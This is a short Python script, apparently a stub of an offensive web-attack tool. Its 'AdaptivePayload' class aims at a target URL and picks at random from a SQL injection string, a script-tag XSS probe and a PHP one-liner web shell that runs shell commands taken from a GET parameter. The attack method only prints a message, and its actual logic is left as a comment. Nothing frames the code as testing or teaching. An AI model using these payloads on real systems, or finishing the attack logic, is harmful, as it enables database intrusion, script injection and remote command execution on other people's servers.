import random

class AdaptivePayload:
    def __init__(self, target_url):
        self.target_url = target_url

    def generate_payload(self):
        payloads = [
            "' OR 1=1 --",
            "<script>alert('XSS')</script>",
            "<?php system($_GET['cmd']); ?>"
        ]
        selected_payload = random.choice(payloads)
        print(f"Generated payload: {selected_payload}")
        return selected_payload

    def attack(self):
        payload = self.generate_payload()
        # Implementing attack logic with adaptive payload
        print(f"Attacking {self.target_url} with payload: {payload}")
